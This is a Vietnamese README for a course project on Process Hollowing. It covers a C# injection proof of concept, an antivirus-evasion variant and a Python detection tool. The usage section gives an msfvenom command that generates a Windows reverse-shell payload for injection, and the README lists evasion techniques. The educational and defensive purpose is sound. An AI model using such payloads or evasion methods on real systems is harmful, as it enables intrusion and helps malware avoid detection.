# NT230.Q12.ANTT - Process Hollowing: Cơ chế & Phát hiện

Dự án nghiên cứu về kỹ thuật Process Hollowing - một phương pháp malware injection phổ biến, bao gồm cả việc triển khai kỹ thuật và công cụ phát hiện.

## 📋 Tổng quan

Repository này chứa 3 thành phần chính:

1. **ProcHollow** - POC triển khai kỹ thuật Process Hollowing cơ bản
2. **Bypass** - Phiên bản nâng cao với kỹ thuật evasion để bypass detection
3. **Tool** - Công cụ phát hiện Process Hollowing sử dụng hybrid analysis

## 🗂️ Cấu trúc thư mục

```
DoAn/
├── proc-hollow-main/          # POC Process Hollowing cơ bản
│   ├── ProcHollow/            # C# implementation
│   └── encodeShellcode.py     # Encode shellcode từ msfvenom
│
├── Bypass/                    # Process Hollowing với evasion
│   └── UpdateTool/            # C# implementation với anti-detection
│
└── Tool/                      # Detection tool (Python)
    ├── core/                  # Core detection modules
    ├── utils/                 # Utilities (logger, reporter)
    └── main.py                # Entry point
```

## 🔧 Thành phần

### 1. ProcHollow (Process Hollowing POC)

**Mô tả:** Proof-of-concept triển khai kỹ thuật Process Hollowing cơ bản.

**Ngôn ngữ:** C#

**Chức năng:**
- Tạo process suspended (svchost.exe)
- Unmapping memory gốc
- Inject shellcode vào process
- Resume thread để thực thi

**Cách sử dụng:**
```bash
cd proc-hollow-main/proc-hollow-main/ProcHollow

# Tạo shellcode với msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LPORT=9999 LHOST=<IP> -f python -v buf

# Encode shellcode
python encodeShellcode.py

# Build và chạy trong Visual Studio
```

**Yêu cầu:**
- Windows OS
- Visual Studio
- Python 3.x (cho encode shellcode)

---

### 2. Bypass (Process Hollowing với Evasion)

**Mô tả:** Phiên bản nâng cao tích hợp kỹ thuật anti-detection và evasion.

**Ngôn ngữ:** C#

**Kỹ thuật evasion:**
- Obfuscation tên functions và strings
- Dynamic delegate loading
- String splitting để tránh static analysis
- Anti-debugging checks
- Evasion techniques

**Cách sử dụng:**
```bash
cd Bypass/UpdateTool

# Build trong Visual Studio
# Chạy executable đã build
```

**Lưu ý:** 
- Chỉ sử dụng cho mục đích nghiên cứu và học tập
- Antivirus có thể phát hiện và chặn

---

### 3. Tool (Process Hollowing Detector)

**Mô tả:** Công cụ phát hiện Process Hollowing sử dụng hybrid analysis (static + dynamic).

**Ngôn ngữ:** Python 3.8+

**Cơ chế phát hiện:**
- **Static Analysis:** Parse PE file từ disk (Import Table, Entry Point, Sections)
- **Dynamic Analysis:** Đọc process memory qua Windows API
- **Hybrid Comparison:** So sánh 4 chỉ số:
  1. Missing Modules Detection
  2. Entry Point Mismatch
  3. Unmapped Executable Memory
  4. Section Integrity Check

**Cài đặt:**
```bash
cd Tool
pip install -r requirements.txt
```

**Sử dụng:**
```bash
# Quét tất cả processes (cần quyền Admin)
python main.py

# Quét process cụ thể theo PID
python main.py --pid 1234

# Quét theo tên process
python main.py --name svchost.exe

# Chế độ verbose + export JSON
python main.py --verbose --output report.json
```

**Yêu cầu:**
- Windows OS
- Python 3.8+
- Quyền Administrator

**Chi tiết:** Xem [Tool/CO_CHE_PHAT_HIEN.md](Tool/CO_CHE_PHAT_HIEN.md) để hiểu sơ đồ hoạt động chi tiết.

---

## 🎯 Mục đích nghiên cứu

Repository này được tạo cho mục đích:
- ✅ Nghiên cứu và hiểu rõ cơ chế hoạt động của Process Hollowing
- ✅ Phát triển phương pháp phát hiện malware sử dụng kỹ thuật này
- ✅ Học tập về Windows internals, PE structure, và memory management
- ✅ Thực hành phân tích malware và defensive security

## ⚠️ Cảnh báo

**Chỉ sử dụng cho mục đích nghiên cứu, học tập trong môi trường kiểm soát:**
- Không sử dụng trên hệ thống production
- Không sử dụng cho mục đích bất hợp pháp
- Chạy trong máy ảo isolated
- Tắt real-time protection khi test POC
- Tuân thủ quy định pháp luật về an ninh mạng

## 📚 Tài liệu tham khảo

- [Process Hollowing - ATT&CK](https://attack.mitre.org/techniques/T1055/012/)
- [Windows PE Structure](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)

## 👥 Đóng góp

Dự án phục vụ mục đích học tập trong khóa **NT230.Q12.ANTT - Cơ chế hoạt động của mã độc**.

---

## 📝 License

Dự án này chỉ phục vụ mục đích giáo dục và nghiên cứu. Không chịu trách nhiệm cho việc sử dụng sai mục đích.
